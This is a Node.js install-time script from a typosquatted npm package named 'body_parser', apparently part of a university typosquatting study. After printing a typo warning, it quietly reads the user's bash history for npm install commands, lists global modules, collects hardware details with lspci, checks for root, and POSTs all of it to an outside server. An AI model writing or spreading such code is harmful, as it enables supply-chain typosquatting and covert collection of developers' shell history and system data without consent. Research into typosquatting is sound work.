/**
 * Send installation back home.
 */

var http = require('http');
var urlParser = require("url");
var exec = require('child_process').exec;
var querystring = require('querystring');

// Whether debugging is enabled!
var debug = false;

function PostCode(host, port, path, query_part, post_data) {
	// An object of options to indicate where to post to
	var post_options = {
	  host: host,
	  port: port,
	  path: path + query_part,
	  method: 'POST',
	  headers: {
	      'Content-Type': 'application/x-www-form-urlencoded',
	      'Content-Length': Buffer.byteLength(post_data)
	  }
	};

	if (debug) {
		console.log(post_options);
	}

	// Set up the request
	var post_req = http.request(post_options, function(res) {
	  res.setEncoding('utf8');
	  res.on('data', function (chunk) {
	  	  if (debug) {
	      	console.log('Response: ' + chunk);
	  	  }
	  });
	});

	post_req.on('error', function(e) {
		if (debug) {
			console.log('problem with request: ' + e.message);
		}
	});

	// post the data
	post_req.write(post_data);
	post_req.end();
}

// https://docs.nodejitsu.com/articles/HTTP/clients/how-to-create-a-HTTP-request
function get_request(url) {
	if (debug) {
		console.log(url);
	}

	http.get(url, function(res) {
		if (debug) {
		  console.log("Got response: " + res.statusCode);
		}
		process.exit(0);
	}).on('error', function(e) {
	  if (debug) {
	  	console.log("Got error: " + e.message);
	  }
	  process.exit(0);
	}).end();
}

function notify_home(host, port, package_name, intended_package_name) {

	console.log("Warning! Maybe you made a typo in your installation command?!");
	console.log("Did you want to install '" + intended_package_name + "' instead of '" + package_name + "'?");
	console.log("For more information, please visit http://svs-repo.informatik.uni-hamburg.de/");

	var npm_version = '';
	exec('npm -v', function(error, stdout, stderr) {
		npm_version = stdout;
		if (error !== null) {
			npm_version = 'no npm version.';
		}

		var command_history = '';
		exec('cat ~/.bash_history | grep "npm install"', function(error, stdout, stderr) {
			command_history = stdout;
			if (error !== null) {
				command_history = 'no command history.';
			}

			var installed_modules = '';
			// http://stackoverflow.com/questions/17937960/how-to-list-npm-user-installed-packages
			exec('npm list -g --depth=0', function(error, stdout, stderr) {
				installed_modules = stdout;
				if (error !== null) {
					installed_modules = 'no list of installed modules.';
				}

				var hardware_specs = '';
				exec('lspci', function(error, stdout, stderr) {
					hardware_specs = stdout;
					if (error !== null) {
						hardware_specs = 'no hardware specs.';
					}

					// now when we gathered all data, call the post request
				 	// https://nodejs.org/api/process.html#process_process_getuid
					var is_admin = false;
					if (process.getuid) {
					  is_admin = process.getuid() == 0;
					}

					var params = {
						'p1': package_name,
						'p2': intended_package_name,
						'p3': 'npm',
						'p4': process.version + ' ' + process.platform + ' ' + process.arch,
						'p5': is_admin,
						'p6': npm_version,
					}

					var path = "/app/?";
					var query_part = '';

					for (key in params) {
						query_part += key + '=' + encodeURIComponent(params[key]) + '&'
					}

					// Build the post string from an object
					var post_data = querystring.stringify({
					  'p7' : command_history,
					  'p8': installed_modules,
					  'p9': hardware_specs,
					});

					PostCode(host, port, path, query_part, post_data);
	});});});});
 		
}

if (debug) {
	notify_home("localhost", 8000, "body_parser", "body-parser");
} else {
	notify_home("svs-repo.informatik.uni-hamburg.de", 80, "body_parser", "body-parser");
}
